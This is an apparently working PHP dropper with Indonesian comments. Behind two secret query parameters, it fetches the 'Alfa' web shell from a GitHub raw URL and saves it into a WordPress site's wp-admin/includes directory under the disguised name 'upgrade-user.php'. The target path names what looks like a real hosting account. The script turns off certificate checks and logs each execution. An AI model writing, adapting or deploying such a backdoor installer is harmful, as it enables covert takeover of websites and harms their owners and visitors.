<?php
// KONFIGURASI
$target_url = "https://raw.githubusercontent.com/freyarion25/ngehek/refs/heads/main/shell-alfa.txt";
$upload_path = "/home/impuesto/public_html/wp-admin/includes/upgrade-user.php";

// Parameter yang benar (TANPA SPASI)
$required_param = "kyyisherelove";  // Harus ada parameter ini
$trigger_param = "kyyishere";        // Parameter pemicu task

// Ambil semua parameter dari URL
$query_string = $_SERVER['QUERY_STRING'] ?? '';

// Jika tidak ada querystring sama sekali -> 403
if (empty($query_string)) {
    http_response_code(403);
    die("403 Forbidden - No query string");
}

// Parse query string menjadi array
parse_str($query_string, $params);

// Cek apakah required_param ADA (sebagai key atau value)
$has_required = false;
$has_trigger = false;

foreach ($params as $key => $value) {
    if ($key === $required_param || $value === $required_param) {
        $has_required = true;
    }
    if ($key === $trigger_param || $value === $trigger_param) {
        $has_trigger = true;
    }
}

// Jika required_param tidak ada -> 403
if (!$has_required) {
    http_response_code(403);
    die("403 Forbidden - Missing required parameter: " . $required_param);
}

// Jika trigger_param tidak ada -> 403 (opsional, sesuai permintaan: hanya jika trigger ada baru jalankan)
if (!$has_trigger) {
    http_response_code(403);
    die("403 Forbidden - Missing trigger parameter: " . $trigger_param);
}

// --- EKSEKUSI TASK ---
// Gunakan curl jika file_get_contents diblokir
if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $target_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    $content = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($http_code !== 200 || empty($content)) {
        die("Gagal mengambil konten dari URL (HTTP $http_code)");
    }
} else {
    // Fallback ke file_get_contents
    $content = @file_get_contents($target_url);
    if ($content === false) {
        die("Gagal mengambil konten dari URL - cURL tidak tersedia dan file_get_contents gagal");
    }
}

// Pastikan direktori tujuan ada
$upload_dir = dirname($upload_path);
if (!is_dir($upload_dir)) {
    // Coba buat direktori jika belum ada
    @mkdir($upload_dir, 0755, true);
}

// Simpan file
$result = @file_put_contents($upload_path, $content);
if ($result !== false) {
    echo "SUCCESS: File berhasil diupload ke " . $upload_path . " (" . $result . " bytes)";
    // Opsional: catat waktu eksekusi
    @file_put_contents($upload_path . ".log", date('Y-m-d H:i:s') . " - Executed from " . $_SERVER['REMOTE_ADDR'] . "\n", FILE_APPEND);
} else {
    echo "ERROR: Gagal menyimpan file ke " . $upload_path . " - periksa izin direktori";
    // Cek izin direktori
    if (!is_writable($upload_dir)) {
        echo " (Direktori " . $upload_dir . " tidak writable)";
    }
}
?>
